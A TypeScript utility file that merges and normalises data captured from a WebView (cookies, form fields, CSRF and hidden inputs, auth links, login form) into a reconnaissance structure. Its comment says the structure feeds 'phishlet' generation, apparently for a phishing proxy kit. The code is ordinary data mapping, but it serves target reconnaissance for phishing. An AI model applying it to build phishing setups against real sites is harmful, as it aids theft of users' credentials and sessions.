// ── Shared captured-data mapping — builds the ReconInput["captured"] shape
// from the raw WebView message data. Used by both the initial phishlet
// generation and the multi-pass iterate step in recon.tsx.

import type { ReconInput } from "@/lib/api/types";

/** Merges an incoming WebView message into an accumulated capture object. */
export function mergeCaptureMessage(
  prev: Record<string, unknown>,
  data: Record<string, unknown>,
): Record<string, unknown> {
  const merged: Record<string, unknown> = { ...prev };
  for (const key of [
    "urls", "cookies", "formFields", "hiddenInputs", "csrfFields",
    "authLinks", "apiEndpoints", "scripts", "forms", "redirects", "domains",
  ]) {
    const arr: unknown[] = Array.isArray(data[key]) ? data[key] as unknown[] : [];
    const existing = (merged[key] as unknown[]) ?? [];
    const seen = new Set(existing.map((v) => typeof v === "string" ? v : JSON.stringify(v)));
    for (const item of arr) {
      const s = typeof item === "string" ? item : JSON.stringify(item);
      if (!seen.has(s)) { seen.add(s); existing.push(item); }
    }
    merged[key] = existing;
  }
  if (data.pageTitle) merged.pageTitle = String(data.pageTitle);
  if (data.formAction) merged.formAction = String(data.formAction);
  if (data.formMethod) merged.formMethod = String(data.formMethod);
  if (data.loginForm && typeof data.loginForm === "object") {
    merged.loginForm = data.loginForm as Record<string, unknown>;
  }
  return merged;
}

/** Converts the cumulative captured state into the ReconInput["captured"] shape. */
export function mapCapturedData(captured: Record<string, unknown>): NonNullable<ReconInput["captured"]> {
  return {
    urls: (captured.urls as string[]) ?? [],
    cookies: (captured.cookies as string[]) ?? [],
    formFields: (captured.formFields as { name: string; type: string; id?: string; placeholder?: string; required?: boolean; autocomplete?: string }[]) ?? [],
    redirects: (captured.redirects as string[]) ?? [],
    domains: (captured.domains as string[]) ?? [],
    pageTitle: captured.pageTitle as string | undefined,
    formAction: captured.formAction as string | undefined,
    formMethod: captured.formMethod as string | undefined,
    hiddenInputs: (captured.hiddenInputs as { name: string; value: string; id?: string }[]) ?? [],
    csrfFields: (captured.csrfFields as { name: string; value: string; id?: string }[]) ?? [],
    authLinks: (captured.authLinks as { href: string; text: string }[]) ?? [],
    apiEndpoints: (captured.apiEndpoints as string[]) ?? [],
    scripts: (captured.scripts as string[]) ?? [],
    forms: (captured.forms as { action: string; method: string; id?: string; name?: string }[]) ?? [],
  };
}
